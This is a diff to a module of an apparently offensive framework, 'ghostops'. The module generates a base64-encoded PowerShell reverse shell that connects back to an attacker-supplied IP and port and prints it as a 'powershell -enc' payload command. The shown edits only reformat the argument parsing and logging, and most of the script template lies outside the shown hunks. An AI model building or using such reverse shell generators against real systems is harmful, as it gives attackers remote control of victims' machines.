@@ -2,6 +2,7 @@ import base64
 from ghostops.core.module_base import BaseModule
 from ghostops.core.utils import Logger
 
+
 class WindowsPowershellReverseTcp(BaseModule):
     module_name = "WindowsPowershellReverseTcp"
     module_description = "Generates a PowerShell reverse shell script."
@@ -12,8 +13,12 @@ class WindowsPowershellReverseTcp(BaseModule):
 
     @staticmethod
     def add_arguments(parser):
-        parser.add_argument('--host', required=True, help='Attacker IP address to connect back to')
-        parser.add_argument('--port', required=True, type=int, help='Port to connect back on')
+        parser.add_argument(
+            "--host", required=True, help="Attacker IP address to connect back to"
+        )
+        parser.add_argument(
+            "--port", required=True, type=int, help="Port to connect back on"
+        )
 
     @staticmethod
     def main(args):
@@ -36,4 +41,7 @@ while(1){{
 
         bytes = script_template.encode("utf-16-le")
         Logger.log("good", f"Size ({len(bytes)} bytes)")
-        Logger.log("good", f"Payload: powershell -enc \"{(base64.b64encode(bytes)).decode("utf-8")}\"")
+        Logger.log(
+            "good",
+            f'Payload: powershell -enc "{(base64.b64encode(bytes)).decode("utf-8")}"',
+        )
